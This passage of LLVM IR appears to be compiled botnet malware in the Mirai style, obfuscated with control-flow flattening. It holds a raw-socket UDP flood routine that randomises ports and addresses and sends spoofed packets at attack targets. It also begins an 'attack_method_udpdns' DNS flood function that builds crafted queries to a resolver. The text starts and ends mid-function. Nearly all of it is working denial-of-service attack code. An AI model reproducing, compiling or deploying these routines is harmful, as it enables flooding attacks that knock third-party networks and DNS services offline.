  %85 = getelementptr inbounds i8*, i8** %82, i64 %84
  %86 = load i8*, i8** %85, align 8
  %87 = bitcast i8* %86 to %struct.iphdr*
  store %struct.iphdr* %87, %struct.iphdr** %20, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %89 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %88, i64 1
  %90 = bitcast %struct.iphdr* %89 to %struct.udphdr*
  store %struct.udphdr* %90, %struct.udphdr** %21, align 8
  %91 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %92 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %91, i64 1
  %93 = bitcast %struct.udphdr* %92 to i8*
  store i8* %93, i8** %22, align 8
  %94 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %95 = bitcast %struct.iphdr* %94 to i8*
  %96 = load i8, i8* %95, align 4
  %97 = and i8 %96, 15
  %98 = or i8 %97, 64
  store i8 %98, i8* %95, align 4
  %99 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %100 = bitcast %struct.iphdr* %99 to i8*
  %101 = load i8, i8* %100, align 4
  %102 = and i8 %101, -16
  %103 = or i8 %102, 5
  store i8 %103, i8* %100, align 4
  %104 = load i8, i8* %12, align 1
  %105 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i32 0, i32 1
  store i8 %104, i8* %106, align 1
  %107 = load i32, i32* %19, align 4
  %108 = sext i32 %107 to i64
  %109 = add i64 32, %108
  %110 = trunc i64 %109 to i16
  %111 = call zeroext i16 @htons(i16 zeroext %110) #7
  %112 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 2
  store i16 %111, i16* %113, align 2
  %114 = load i16, i16* %13, align 2
  %115 = call zeroext i16 @htons(i16 zeroext %114) #7
  %116 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 3
  store i16 %115, i16* %117, align 4
  %118 = load i8, i8* %14, align 1
  %119 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %120 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %119, i32 0, i32 5
  store i8 %118, i8* %120, align 4
  %121 = load i8, i8* %15, align 1
  %122 = icmp ne i8 %121, 0
  %123 = select i1 %122, i32 -1017550288, i32 591067222
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %126 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %127 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %126, i32 0, i32 4
  store i16 %125, i16* %127, align 2
  store i32 591067222, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i32 0, i32 6
  store i8 17, i8* %130, align 1
  %131 = load i32, i32* @LOCAL_ADDR, align 4
  %132 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 8
  store i32 %131, i32* %133, align 4
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 9
  store i32 %139, i32* %141, align 4
  %142 = load i16, i16* %16, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %142) #7
  %144 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %145 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %144, i32 0, i32 0
  store i16 %143, i16* %145, align 2
  %146 = load i16, i16* %17, align 2
  %147 = call zeroext i16 @htons(i16 zeroext %146) #7
  %148 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %149 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %148, i32 0, i32 1
  store i16 %147, i16* %149, align 2
  %150 = load i32, i32* %19, align 4
  %151 = sext i32 %150 to i64
  %152 = add i64 12, %151
  %153 = trunc i64 %152 to i16
  %154 = call zeroext i16 @htons(i16 zeroext %153) #7
  %155 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %156 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %155, i32 0, i32 2
  store i16 %154, i16* %156, align 2
  %157 = load i8*, i8** %22, align 8
  %158 = bitcast i8* %157 to i32*
  store i32 -1, i32* %158, align 4
  %159 = load i8*, i8** %22, align 8
  %160 = getelementptr inbounds i8, i8* %159, i64 4
  store i8* %160, i8** %22, align 8
  %161 = load i8*, i8** %22, align 8
  %162 = load i8*, i8** %18, align 8
  %163 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %161, i8* %162, i32 %163)
  store i32 -313469702, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i32, i32* %9, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %9, align 4
  store i32 -581211155, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  store i32 1651819246, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 2119765407, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i32, i32* %9, align 4
  %171 = load i8, i8* %5, align 1
  %172 = zext i8 %171 to i32
  %173 = icmp slt i32 %170, %172
  %174 = select i1 %173, i32 787372598, i32 424038874
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i8**, i8*** %11, align 8
  %177 = load i32, i32* %9, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i8*, i8** %176, i64 %178
  %180 = load i8*, i8** %179, align 8
  store i8* %180, i8** %23, align 8
  %181 = load i8*, i8** %23, align 8
  %182 = bitcast i8* %181 to %struct.iphdr*
  store %struct.iphdr* %182, %struct.iphdr** %24, align 8
  %183 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i64 1
  %185 = bitcast %struct.iphdr* %184 to %struct.udphdr*
  store %struct.udphdr* %185, %struct.udphdr** %25, align 8
  %186 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i32 0, i32 2
  %191 = load i8, i8* %190, align 4
  %192 = zext i8 %191 to i32
  %193 = icmp slt i32 %192, 32
  %194 = select i1 %193, i32 -360695106, i32 2020467044
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i32 0, i32 1
  %201 = load i32, i32* %200, align 4
  %202 = call i32 @ntohl(i32 %201) #7
  %203 = call i32 @rand_next()
  %204 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %205 = load i32, i32* %9, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 2
  %209 = load i8, i8* %208, align 4
  %210 = zext i8 %209 to i32
  %211 = lshr i32 %203, %210
  %212 = add i32 %202, %211
  %213 = call i32 @htonl(i32 %212) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 9
  store i32 %213, i32* %215, align 4
  store i32 2020467044, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i16, i16* %13, align 2
  %218 = zext i16 %217 to i32
  %219 = icmp eq i32 %218, 65535
  %220 = select i1 %219, i32 -919499455, i32 2007087493
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = call i32 @rand_next()
  %223 = trunc i32 %222 to i16
  %224 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 3
  store i16 %223, i16* %225, align 4
  store i32 2007087493, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i16, i16* %16, align 2
  %228 = zext i16 %227 to i32
  %229 = icmp eq i32 %228, 65535
  %230 = select i1 %229, i32 -1254114813, i32 2074232423
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = call i32 @rand_next()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  store i16 %233, i16* %235, align 2
  store i32 2074232423, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i16, i16* %17, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %238, 65535
  %240 = select i1 %239, i32 1560380442, i32 -18481764
  store i32 %240, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i32 @rand_next()
  %243 = trunc i32 %242 to i16
  %244 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %245 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %244, i32 0, i32 1
  store i16 %243, i16* %245, align 2
  store i32 -18481764, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 7
  store i16 0, i16* %248, align 2
  %249 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %250 = bitcast %struct.iphdr* %249 to i16*
  %251 = call zeroext i16 @checksum_generic(i16* %250, i32 20)
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 7
  store i16 %251, i16* %253, align 2
  %254 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %255 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %254, i32 0, i32 3
  store i16 0, i16* %255, align 2
  %256 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %257 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %258 = bitcast %struct.udphdr* %257 to i8*
  %259 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %260 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %259, i32 0, i32 2
  %261 = load i16, i16* %260, align 2
  %262 = load i32, i32* %19, align 4
  %263 = sext i32 %262 to i64
  %264 = add i64 12, %263
  %265 = trunc i64 %264 to i32
  %266 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %256, i8* %258, i16 zeroext %261, i32 %265)
  %267 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %268 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %267, i32 0, i32 3
  store i16 %266, i16* %268, align 2
  %269 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %270 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %269, i32 0, i32 1
  %271 = load i16, i16* %270, align 2
  %272 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %273 = load i32, i32* %9, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i64 %274
  %276 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i32 0, i32 0
  %277 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %276, i32 0, i32 1
  store i16 %271, i16* %277, align 2
  %278 = load i32, i32* %10, align 4
  %279 = load i8*, i8** %23, align 8
  %280 = load i32, i32* %19, align 4
  %281 = sext i32 %280 to i64
  %282 = add i64 32, %281
  %283 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %284 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %287, i32 0, i32 0
  %289 = bitcast %struct.sockaddr_in* %288 to %struct.sockaddr*
  store %struct.sockaddr* %289, %struct.sockaddr** %283, align 8
  %290 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %291 = load %struct.sockaddr*, %struct.sockaddr** %290, align 8
  %292 = call i64 @sendto(i32 %278, i8* %279, i64 %282, i32 16384, %struct.sockaddr* %291, i32 16)
  store i32 -249591664, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i32, i32* %9, align 4
  %295 = add nsw i32 %294, 1
  store i32 %295, i32* %9, align 4
  store i32 2119765407, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  store i32 1651819246, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %296, %293, %246, %241, %236, %231, %226, %221, %216, %195, %175, %169, %168, %167, %164, %128, %124, %76, %70, %69, %66, %60, %59, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  store i8* %78, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 1818874023, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1818874023, label %first
    i32 2116211698, label %81
    i32 230042600, label %82
    i32 935187112, label %88
    i32 570612981, label %89
    i32 939999114, label %95
    i32 2013256502, label %98
    i32 -576746418, label %99
    i32 -397039345, label %105
    i32 -902590245, label %161
    i32 931914132, label %165
    i32 1220850054, label %218
    i32 -1888432117, label %223
    i32 -675668423, label %232
    i32 -51088409, label %242
    i32 -1669415731, label %245
    i32 1797829454, label %246
    i32 -1594477352, label %249
    i32 867171941, label %264
    i32 -1055774619, label %267
    i32 153356381, label %268
    i32 382521061, label %269
    i32 287523686, label %275
    i32 1082054699, label %297
    i32 1490460749, label %303
    i32 -576851030, label %308
    i32 -1783007513, label %314
    i32 359752554, label %319
    i32 1318289730, label %325
    i32 927933937, label %330
    i32 544532475, label %336
    i32 1031794705, label %404
    i32 686282128, label %407
    i32 -1378424236, label %408
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %79 = icmp eq i8* %.reload, null
  %80 = select i1 %79, i32 2116211698, i32 230042600
  store i32 %80, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 -1378424236, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8*, i8** %20, align 8
  %84 = call i32 @util_strlen(i8* %83)
  store i32 %84, i32* %21, align 4
  %85 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %85, i32* %10, align 4
  %86 = icmp eq i32 %85, -1
  %87 = select i1 %86, i32 935187112, i32 570612981
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 -1378424236, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %90 = load i32, i32* %10, align 4
  %91 = bitcast i32* %9 to i8*
  %92 = call i32 @setsockopt(i32 %90, i32 0, i32 3, i8* %91, i32 4) #6
  %93 = icmp eq i32 %92, -1
  %94 = select i1 %93, i32 939999114, i32 2013256502
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i32, i32* %10, align 4
  %97 = call i32 @close(i32 %96)
  store i32 -1378424236, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -576746418, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %9, align 4
  %101 = load i8, i8* %5, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp slt i32 %100, %102
  %104 = select i1 %103, i32 -397039345, i32 -1055774619
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %106 = call noalias i8* @calloc(i64 600, i64 1) #6
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  store i8* %106, i8** %110, align 8
  %111 = load i8**, i8*** %11, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = bitcast i8* %115 to %struct.iphdr*
  store %struct.iphdr* %116, %struct.iphdr** %26, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i64 1
  %119 = bitcast %struct.iphdr* %118 to %struct.udphdr*
  store %struct.udphdr* %119, %struct.udphdr** %27, align 8
  %120 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %121 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %120, i64 1
  %122 = bitcast %struct.udphdr* %121 to %struct.dnshdr*
  store %struct.dnshdr* %122, %struct.dnshdr** %28, align 8
  %123 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %124 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %123, i64 1
  %125 = bitcast %struct.dnshdr* %124 to i8*
  store i8* %125, i8** %29, align 8
  %126 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %127 = bitcast %struct.iphdr* %126 to i8*
  %128 = load i8, i8* %127, align 4
  %129 = and i8 %128, 15
  %130 = or i8 %129, 64
  store i8 %130, i8* %127, align 4
  %131 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = and i8 %133, -16
  %135 = or i8 %134, 5
  store i8 %135, i8* %132, align 4
  %136 = load i8, i8* %12, align 1
  %137 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i32 0, i32 1
  store i8 %136, i8* %138, align 1
  %139 = load i8, i8* %19, align 1
  %140 = zext i8 %139 to i64
  %141 = add i64 41, %140
  %142 = add i64 %141, 2
  %143 = load i32, i32* %21, align 4
  %144 = sext i32 %143 to i64
  %145 = add i64 %142, %144
  %146 = add i64 %145, 4
  %147 = trunc i64 %146 to i16
  %148 = call zeroext i16 @htons(i16 zeroext %147) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 2
  store i16 %148, i16* %150, align 2
  %151 = load i16, i16* %13, align 2
  %152 = call zeroext i16 @htons(i16 zeroext %151) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 3
  store i16 %152, i16* %154, align 4
  %155 = load i8, i8* %14, align 1
  %156 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 5
  store i8 %155, i8* %157, align 4
  %158 = load i8, i8* %15, align 1
  %159 = icmp ne i8 %158, 0
  %160 = select i1 %159, i32 -902590245, i32 931914132
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %163 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 4
  store i16 %162, i16* %164, align 2
  store i32 931914132, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 6
  store i8 17, i8* %167, align 1
  %168 = load i32, i32* @LOCAL_ADDR, align 4
  %169 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 8
  store i32 %168, i32* %170, align 4
  %171 = load i32, i32* %22, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 9
  store i32 %171, i32* %173, align 4
  %174 = load i16, i16* %16, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %177 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %176, i32 0, i32 0
  store i16 %175, i16* %177, align 2
  %178 = load i16, i16* %17, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %181 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %180, i32 0, i32 1
  store i16 %179, i16* %181, align 2
  %182 = load i8, i8* %19, align 1
  %183 = zext i8 %182 to i64
  %184 = add i64 21, %183
  %185 = add i64 %184, 2
  %186 = load i32, i32* %21, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 %185, %187
  %189 = add i64 %188, 4
  %190 = trunc i64 %189 to i16
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %193 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %192, i32 0, i32 2
  store i16 %191, i16* %193, align 2
  %194 = load i16, i16* %18, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %197 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %196, i32 0, i32 0
  store i16 %195, i16* %197, align 2
  %198 = call zeroext i16 @htons(i16 zeroext 256) #7
  %199 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %200 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %199, i32 0, i32 1
  store i16 %198, i16* %200, align 2
  %201 = call zeroext i16 @htons(i16 zeroext 1) #7
  %202 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %203 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %202, i32 0, i32 2
  store i16 %201, i16* %203, align 2
  %204 = load i8, i8* %19, align 1
  %205 = load i8*, i8** %29, align 8
  %206 = getelementptr inbounds i8, i8* %205, i32 1
  store i8* %206, i8** %29, align 8
  store i8 %204, i8* %205, align 1
  %207 = load i8, i8* %19, align 1
  %208 = zext i8 %207 to i32
  %209 = load i8*, i8** %29, align 8
  %210 = sext i32 %208 to i64
  %211 = getelementptr inbounds i8, i8* %209, i64 %210
  store i8* %211, i8** %29, align 8
  %212 = load i8*, i8** %29, align 8
  store i8* %212, i8** %30, align 8
  %213 = load i8*, i8** %29, align 8
  %214 = getelementptr inbounds i8, i8* %213, i64 1
  %215 = load i8*, i8** %20, align 8
  %216 = load i32, i32* %21, align 4
  %217 = add nsw i32 %216, 1
  call void @util_memcpy(i8* %214, i8* %215, i32 %217)
  store i32 0, i32* %23, align 4
  store i32 1220850054, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %23, align 4
  %220 = load i32, i32* %21, align 4
  %221 = icmp slt i32 %219, %220
  %222 = select i1 %221, i32 -1888432117, i32 -1594477352
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i8*, i8** %20, align 8
  %225 = load i32, i32* %23, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds i8, i8* %224, i64 %226
  %228 = load i8, i8* %227, align 1
  %229 = sext i8 %228 to i32
  %230 = icmp eq i32 %229, 46
  %231 = select i1 %230, i32 -675668423, i32 -51088409
  store i32 %231, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %233 = load i8, i8* %24, align 1
